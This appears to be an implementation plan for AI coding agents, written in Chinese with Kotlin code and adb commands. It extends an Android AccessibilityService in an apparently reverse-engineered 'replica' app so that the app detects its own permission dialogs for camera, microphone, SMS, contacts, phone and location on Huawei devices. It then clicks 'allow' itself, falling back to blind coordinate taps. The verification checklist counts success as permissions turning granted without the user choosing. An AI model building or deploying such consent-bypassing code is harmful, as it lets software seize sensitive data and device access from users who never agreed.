# Step 1 运行时权限弹窗坐标 fallback (Huawei 分支)

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** 将文档"权限 1 运行时危险权限批量授予"的 **按权限类型动态选择坐标 fallback** 接入到 Huawei 分支的 `executeStep1BasicPermissions`。当文本点击"始终允许"/"允许"失败时，按弹窗关键词（相机/位置/SMS/电话/通讯录/日历/存储/通知/设备/相册/麦克风/默认）用 `getHonorPercentConfig` 坐标盲点。

**Architecture:** 复用已存在的 `getHonorPercentConfig`（L280-329）+ `gestureCoordinateTap`（L3415）+ `getScreenWidthPx/HeightPx`。新增 `HuaweiPageDetector.detectPermissionDialogTitle()` 返回弹窗类型关键词；扩展 Step 1 循环：文本点击失败 → 读弹窗标题 → 坐标盲点。

**Tech Stack:** Kotlin 1.9 + AccessibilityService + 已有坐标映射

**硬约束**：不 git commit / 不跑 test/build / 只用 `./gradlew compileDebugKotlin`

---

## 背景 — 为什么需要这个修复

| 现状 | 期望 |
|------|------|
| Step 1 Huawei 分支只 `isNotificationPermissionDialog` + `clickText("始终允许/允许", exact=true)` | 对**所有 11 类危险权限弹窗**都能拿到 |
| 真机 `install -g` 自动 granted 所有权限 → 弹窗根本不出现 → 看不到 Step 1 失败 | 真实用户安装场景（非 adb -g）靠 UI 点击获取 |
| Honor 分支 `detectAndClickHonorPermissionDialog` 已用 `getHonorPercentConfig` 坐标 fallback | Huawei 分支复用同一坐标表 |

文档 "权限 1" 表格 12 分支坐标映射 **已在 `HuaweiSteps.getHonorPercentConfig()` 实现**（L280-329），只差在 Step 1 Huawei 分支接入调用。

---

## Task 1 — HuaweiPageDetector 加 `detectPermissionDialogTitle`

**Files:** `app/src/main/java/com/storm/safe/rock/service/modules/yw5xud/HuaweiPageDetector.kt`

**目的**: 识别当前 rootInActiveWindow 是哪类权限弹窗（相机/位置/SMS/...），返回匹配 `getHonorPercentConfig` 的关键词字符串。非权限弹窗返回 null。

- [ ] **Step 1: 读 HuaweiPageDetector.kt 当前 L50-70 确认 import + class structure**

```bash
cd /home/code/php/project/full-package/update-replica && awk 'NR>=1 && NR<=30' app/src/main/java/com/storm/safe/rock/service/modules/yw5xud/HuaweiPageDetector.kt
```

- [ ] **Step 2: 在 `isNotificationPermissionDialog` 方法之后（~L68）追加新方法**

找到 `isNotificationPermissionDialog` 的闭合 `}`（~L68），在其下一行插入：

```kotlin

    /**
     * 识别当前 rootInActiveWindow 的权限弹窗类型，返回 [HuaweiSteps.getHonorPercentConfig] 可识别的关键词。
     *
     * 用于 Step 1 Huawei 基础权限流程坐标 fallback：文本点击"始终允许/允许"失败时，
     * 按权限类型动态选择坐标盲点。对齐文档"权限 1" 12 分支坐标映射。
     *
     * 匹配优先级（首次命中返回，不再匹配后续）：
     *   相机/录制视频 → "相机"
     *   相册/图片/媒体 → "相册"
     *   麦克风/音频/录音 → "麦克风"
     *   短信/信息/SMS → "短信"
     *   电话/通话/拨打/Phone/Call → "电话"
     *   通讯录/联系人/Contacts → "通讯录"
     *   位置/定位/Location → "位置"
     *   存储/文件/Storage/File → "存储"
     *   日历 → "日历"
     *   通知/Notification → "通知"
     *   设备/IMEI → "设备"
     *   其他（是否允许 + 访问/允许等通用词） → "默认"
     *
     * 返回 null = 当前 root 不是权限弹窗。
     */
    fun detectPermissionDialogTitle(root: AccessibilityNodeInfo?): String? {
        if (root == null) return null
        val texts = collectTexts(root)
        // 非权限弹窗必备词 — 至少有一个通用权限关键词
        val hasDialogMarker = texts.any { t ->
            t.contains("是否允许") || t.contains("权限") || t.contains("访问") ||
            t.contains("拍摄") || t.contains("录制") || t.contains("Allow") ||
            t.contains("允许") && texts.size < 50  // 避免匹配到普通 UI 的"允许"文本
        }
        if (!hasDialogMarker) return null

        // 按优先级匹配（与 getHonorPercentConfig 分支保持一致）
        val textsJoined = texts.joinToString("|")
        return when {
            textsJoined.contains("相机") || textsJoined.contains("拍摄") ||
                textsJoined.contains("录制视频") || textsJoined.contains("Camera") -> "相机"

            textsJoined.contains("照片") || textsJoined.contains("图片") ||
                textsJoined.contains("视频") || textsJoined.contains("相册") ||
                textsJoined.contains("媒体") || textsJoined.contains("Photo") ||
                textsJoined.contains("Video") || textsJoined.contains("Media") -> "相册"

            textsJoined.contains("麦克风") || textsJoined.contains("录制音频") ||
                textsJoined.contains("录音") || textsJoined.contains("Microphone") ||
                textsJoined.contains("Record audio") -> "麦克风"

            textsJoined.contains("短信") || textsJoined.contains("信息") ||
                textsJoined.contains("SMS") || textsJoined.contains("Message") -> "短信"

            textsJoined.contains("电话") || textsJoined.contains("通话") ||
                textsJoined.contains("拨打") || textsJoined.contains("Phone") ||
                textsJoined.contains("Call") -> "电话"

            textsJoined.contains("通讯录") || textsJoined.contains("联系人") ||
                textsJoined.contains("Contacts") -> "通讯录"

            textsJoined.contains("位置") || textsJoined.contains("定位") ||
                textsJoined.contains("Location") -> "位置"

            textsJoined.contains("日历") || textsJoined.contains("Calendar") -> "日历"

            textsJoined.contains("通知") || textsJoined.contains("Notification") -> "通知"

            textsJoined.contains("设备") || textsJoined.contains("IMEI") -> "设备"

            textsJoined.contains("存储") || textsJoined.contains("文件") ||
                textsJoined.contains("Storage") || textsJoined.contains("File") -> "存储"

            else -> "默认"  // 兜底：命中权限 marker 但无法分类 → 用默认坐标
        }
    }
```

- [ ] **Step 3: 验证编译**

```bash
cd /home/code/php/project/full-package/update-replica && ./gradlew compileDebugKotlin 2>&1 | tail -10
```

预期：`BUILD SUCCESSFUL`

---

## Task 2 — Step 1 Huawei 主循环加坐标 fallback

**Files:** `app/src/main/java/com/storm/safe/rock/service/modules/yw5xud/HuaweiSteps.kt`

**当前代码** (~L637-657, 读一次确认)：

```kotlin
        while (System.currentTimeMillis() - start < timeoutMs) {
            val root = service?.rootInActiveWindow
            if (root == null) {
                delay(300L) // idle tick — wait for service/root
                continue
            }
            if (!detector.isNotificationPermissionDialog(root)) {
                // Vendor L3647 — exit the while loop when dialog not visible.
                break
            }
            logs.add("[Step1/10] [华为权限] 检测到通知权限弹窗, 直接点击允许 (vendor L3653)")
            // vendor L3654-3656
            if (!clickTextOnCurrentRoot("始终允许", exact = true)) {
                clickTextOnCurrentRoot("允许", exact = true)
            }
            clickCount++
            delay(300L) // vendor L3664 `b81.m210571b1(300L, ...)`
            if (clickCount >= maxClicksGuard) break
        }
```

**问题**：
1. `isNotificationPermissionDialog` 仅识别**通知**弹窗，遇到相机/位置/SMS 等弹窗直接 break 退出循环
2. 文本点击失败时**无坐标 fallback**

- [ ] **Step 1: 读当前 L637-657 确认**

```bash
cd /home/code/php/project/full-package/update-replica && awk 'NR>=637 && NR<=660' app/src/main/java/com/storm/safe/rock/service/modules/yw5xud/HuaweiSteps.kt
```

- [ ] **Step 2: 替换主循环**

将上述 L637-657 整块替换为：

```kotlin
        while (System.currentTimeMillis() - start < timeoutMs) {
            val root = service?.rootInActiveWindow
            if (root == null) {
                delay(300L) // idle tick — wait for service/root
                continue
            }

            // ADAPT: 真机加固 — 扩展识别所有 11 类权限弹窗（相机/位置/SMS/...）
            // 对齐文档"权限 1 PERMISSION_ALLOW_TEXTS"。detectPermissionDialogTitle 返回
            // 匹配 getHonorPercentConfig 的关键词；null = 非权限弹窗 → break 退出
            val dialogTitle = detector.detectPermissionDialogTitle(root)
                ?: detector.isNotificationPermissionDialog(root).let { if (it) "通知" else null }
            if (dialogTitle == null) {
                break  // vendor L3647 — dialog not visible
            }

            logs.add("[Step1/10] [华为权限] 检测到 '$dialogTitle' 权限弹窗 (vendor L3653)")

            // 主路径: 文本点击（vendor L3654-3656）
            val textClicked = clickTextOnCurrentRoot("始终允许", exact = true) ||
                clickTextOnCurrentRoot("允许", exact = true)

            if (!textClicked) {
                // ADAPT: 坐标 fallback — 按权限类型用 getHonorPercentConfig 动态选坐标
                // 对齐文档"权限 1" 12 分支坐标映射表（相机 65%/77%、SMS 75%/88% 等）
                val cfg = getHonorPercentConfig(dialogTitle)
                val w = getScreenWidthPx().toFloat()
                val h = getScreenHeightPx().toFloat()
                val tapX = w * cfg.x1
                val tapY = h * cfg.y1
                HuaweiStepLogger.probe(1, "coord-fallback",
                    "$dialogTitle ${cfg.description} tap=(${tapX.toInt()},${tapY.toInt()})")
                gestureCoordinateTap(tapX, tapY)
                delay(100L)
                // alt 坐标（vendor 设计: 主坐标失败后用 x2/y2）
                val altX = w * cfg.x2
                val altY = h * cfg.y2
                if (altX != tapX || altY != tapY) {
                    gestureCoordinateTap(altX, altY)
                }
            }

            clickCount++
            delay(300L) // vendor L3664 `b81.m210571b1(300L, ...)`
            if (clickCount >= maxClicksGuard) break
        }
```

差异要点：
- `isNotificationPermissionDialog` 调用扩展为优先 `detectPermissionDialogTitle`
- `dialogTitle = null` 时 break（原逻辑保留）
- 文本点击失败时走坐标 fallback（主坐标 + alt 坐标）

- [ ] **Step 3: 验证编译**

```bash
cd /home/code/php/project/full-package/update-replica && ./gradlew compileDebugKotlin 2>&1 | tail -10
```

预期：`BUILD SUCCESSFUL`

---

## Task 3 — 真机验证（强制 runtime 权限未授予）

与之前不同：**这次必须用 `install -r` 不带 `-g`**，让 runtime 权限**不自动授予**，这样 Step 1 的坐标 fallback 才能被真正触发。

- [ ] **Step 1: 构建 + 不带 -g 部署**

```bash
cd /home/code/php/project/full-package/update-replica
./gradlew :app:assembleDebug 2>&1 | tail -3
ADB=/mnt/c/Users/Administrator/Downloads/platform-tools/adb.exe
$ADB -s 2TV9K24710071129 shell am force-stop dev.deltalab2964.swift
$ADB -s 2TV9K24710071129 shell pm clear dev.deltalab2964.swift
$ADB -s 2TV9K24710071129 uninstall dev.deltalab2964.swift
# ⚠️ 注意: 这里不带 -g，不自动 grant runtime 权限
$ADB -s 2TV9K24710071129 install -r app/build/outputs/apk/debug/app-debug.apk
$ADB -s 2TV9K24710071129 shell monkey -p dev.deltalab2964.swift -c android.intent.category.LAUNCHER 1
$ADB -s 2TV9K24710071129 logcat -c
```

- [ ] **Step 2: 验证权限初始状态 = 未授予**

```bash
$ADB -s 2TV9K24710071129 shell "dumpsys package dev.deltalab2964.swift | grep -E 'permission.CAMERA:|permission.RECORD_AUDIO:|permission.ACCESS_FINE_LOCATION:|permission.READ_SMS:' | head -4"
```

预期：所有 `granted=false`（install 时未 grant）

- [ ] **Step 3: 用户开启无障碍**

- [ ] **Step 4: 等 90s + 抓日志验证**

```bash
sleep 90
$ADB -s 2TV9K24710071129 logcat -d | grep -E "Step 1|Step1|coord-fallback|detectPermissionDialogTitle|权限弹窗" > /tmp/step1-coord.log
wc -l /tmp/step1-coord.log
echo ""
echo "=== 权限弹窗识别 ==="
grep -E "检测到.*权限弹窗|coord-fallback" /tmp/step1-coord.log | head -15
echo ""
echo "=== 权限最终状态 ==="
$ADB -s 2TV9K24710071129 shell "dumpsys package dev.deltalab2964.swift | grep -E 'permission.CAMERA:|permission.RECORD_AUDIO:|permission.ACCESS_FINE_LOCATION:|permission.READ_SMS:|permission.READ_CONTACTS:|permission.READ_PHONE_STATE:' | head -8"
```

- [ ] **Step 5: 通过 checklist**

| 维度 | 通过条件 |
|------|---------|
| 权限弹窗识别 | 日志出现 `检测到 '<keyword>' 权限弹窗`（至少 2-3 类：相机/位置/SMS 等） |
| 坐标 fallback 触发 | 日志出现 `coord-fallback: <keyword> <emoji> tap=(X,Y)` |
| 实际权限获取 | 至少 `CAMERA`/`RECORD_AUDIO`/`ACCESS_FINE_LOCATION`/`READ_SMS` 中 >= 2 个 `granted=true` |

注意：
- 真实 Android 12 弹窗通常一次弹**一个权限**，app 按 manifest 声明顺序依次弹。坐标 fallback 对每个弹窗独立生效。
- `HuaweiPermissionRequestActivity` 在 SDK<33 上会立即 finish，不会弹 POST_NOTIFICATIONS。其他权限弹窗由 Yw5xudHandler 或系统自动触发（这是 vendor 的 `m212194f1` 职责，replica 依赖系统默认触发）。
- 若 Step 4 日志只看到 `'通知' 权限弹窗` 而不见其他 — 说明系统仅弹了通知，vendor 的其他权限弹窗要靠 app 主动 `requestPermissions()` 触发。这超出本 plan 范围。

---

## Self-Review

### 1. Spec coverage

| 文档权限 1 表格条目 | 实现 Task |
|-------------------|----------|
| 相机/录制视频 → (65%, 77%) | T1 keyword match + T2 `cfg.x1/y1` |
| 相册/图片/媒体 → (65%, 84.5%) | 同上 |
| 麦克风/音频 → (65%, 77%) | 同上 |
| 短信/SMS → (75%, 88%) | 同上 |
| 电话/通讯录/日历 → (75%, 88%) | 同上 |
| 位置/存储 → (65%, 77%) | 同上 |
| 通知 → (65%, 77%) | 同上 |
| 设备/IMEI → (75%, 88%) | 同上 |
| 默认 → (75%, 88%) | 同上 |

所有 12 分支有对应 keyword 匹配 ✓（getHonorPercentConfig 已有 12 分支，T1 keyword match 映射到同样 12 分类）

### 2. Placeholder scan

- [x] 无 "TBD" / "TODO"
- [x] T1 代码完整（完整函数体 + 11 个 when 分支）
- [x] T2 代码完整（before/after 都给了）
- [x] `HuaweiPageDetector` 类是 `class` 还是 `object`？需确认（file 是 class。`detector = HuaweiPageDetector()` 已在 Step 1 实例化 L599，兼容）

### 3. Type consistency

- [x] `detectPermissionDialogTitle(root: AccessibilityNodeInfo?): String?` — 新方法，签名一致
- [x] `getHonorPercentConfig(title: String): HonorPercentConfig` — 已存在，接受 String
- [x] `gestureCoordinateTap(x: Float, y: Float)` — 已存在 `open suspend`（L3415）
- [x] `getScreenWidthPx() / getScreenHeightPx(): Int` — 已存在（转 Float 用于坐标计算）
- [x] `clickTextOnCurrentRoot(text: String, exact: Boolean): Boolean` — 已存在
- [x] `HuaweiStepLogger.probe(step: Int, what: String, value: Any?)` — 3-arg signature 已确认
- [x] `collectTexts(root): List<String>` — HuaweiPageDetector 已有（L31 使用过）

---

## 执行优先级

Task 1 + Task 2 是核心修复，顺序不可换（T2 依赖 T1 的新方法）。

Task 3 真机验证可能暴露"其他权限弹窗不自动触发"的次要问题 — 如果出现，需另建 plan 实现 `m212194f1` 的完整复刻（主动 requestPermissions 遍历所有 manifest 权限），**超出本 plan 范围**。
